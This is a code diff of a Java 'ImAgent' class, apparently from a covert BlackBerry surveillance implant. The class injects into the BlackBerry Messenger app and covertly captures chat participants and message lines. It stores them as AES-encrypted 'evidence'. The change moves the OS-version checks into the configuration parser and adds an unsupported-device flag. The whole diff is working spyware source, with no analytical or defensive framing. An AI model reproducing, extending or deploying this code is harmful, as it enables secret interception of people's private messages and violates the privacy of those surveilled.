@@ -46,6 +46,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
     String appName = "Messenger";
 
     LineMarkup markup;
+    private boolean unsupported;
 
     /**
      * Instantiates a new task agents
@@ -55,20 +56,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
      */
     public ImAgent(final boolean agentEnabled) {
         super(Agent.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
-
-        if(!Device.getInstance().atLeast(5, 0)){
-            //#ifdef DEBUG
-            debug.error("ImAgent: not supported before OS 5.0");
-            //#endif
-            enable(false);
-        }
-        
-        if(!Device.getInstance().lessThan(7, 0)){
-            //#ifdef DEBUG
-            debug.error("ImAgent: not supported before OS 5.0");
-            //#endif
-            enable(false);
-        }
 
     }
 
@@ -90,7 +77,43 @@ public final class ImAgent extends Agent implements BacklightObserver,
         markup = new LineMarkup(agentId, Encryption.getKeys().getAesKey());
 
     }
-    
+
+    /*
+     * (non-Javadoc)
+     * @see blackberry.agent.Agent#parse(byte[])
+     */
+    protected boolean parse(final byte[] confParameters) {
+        //#ifdef DEBUG
+        if (confParameters != null) {
+            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
+        } else {
+            debug.trace("parse: null");
+        }
+        //#endif
+
+        if (!Device.getInstance().atLeast(5, 0)) {
+            //#ifdef DEBUG
+            debug.error("ImAgent: not supported before OS 5.0");
+            //#endif
+            unsupported = true;
+            Evidence.info("UNS BBM");
+            return false;
+        }
+
+        if (Device.getInstance().atLeast(7, 0)) {
+            //#ifdef DEBUG
+            debug.error("ImAgent: not supported on OS 7.0");
+            //#endif
+            unsupported = true;
+            Evidence.info("UNS BBM");
+            return false;
+        }
+
+        setPeriod(APP_TIMER_PERIOD);
+        setDelay(APP_TIMER_PERIOD);
+        return true;
+    }
+
     private synchronized String unserialize(String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize");
@@ -129,13 +152,17 @@ public final class ImAgent extends Agent implements BacklightObserver,
         debug.trace("actualStart");
         //#endif
 
+        if (unsupported) {
+            return;
+        }
+
         AppListener.getInstance().addBacklightObserver(this);
         AppListener.getInstance().addApplicationObserver(this);
 
         try {
             if (appInjector == null) {
                 appInjector = new AppInjector(AppInjector.APP_BBM);
-            }else{
+            } else {
                 appInjector.reset();
             }
 
@@ -144,7 +171,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.error("actualStart: " + ex);
             //#endif
         }
-        
+
         if (!Backlight.isEnabled() && !appInjector.isInfected()) {
             //#ifdef DEBUG
             debug.info("injecting");
@@ -167,6 +194,10 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
     public void actualRun() {
 
+        if (unsupported) {
+            return;
+        }
+
         if (appInjector.isInfected() && Backlight.isEnabled()
                 && isAppForeground) {
             //#ifdef DEBUG
@@ -175,24 +206,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
             appInjector.callMenuInContext();
         }
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-        //#ifdef DEBUG
-        if (confParameters != null) {
-            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
-        } else {
-            debug.trace("parse: null");
-        }
-        //#endif
-
-        setPeriod(APP_TIMER_PERIOD);
-        setDelay(APP_TIMER_PERIOD);
-        return false;
     }
 
     public void onBacklightChange(boolean on) {
@@ -277,7 +290,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
             serialize(partecipants, lastLine);
             //#ifdef DEBUG
-            debug.trace("write evidence from line: " + lastEqual +1);
+            debug.trace("write evidence from line: " + lastEqual + 1);
             //#endif
             writeEvidence(partecipants, lines, lastEqual + 1);
 
@@ -324,10 +337,10 @@ public final class ImAgent extends Agent implements BacklightObserver,
         evidence.atomicWriteOnce(items);
 
     }
-    
+
     //#ifdef DEBUG
-    public void disinfect(){
-        if(appInjector!=null){
+    public void disinfect() {
+        if (appInjector != null) {
             appInjector.disinfect();
         }
     }
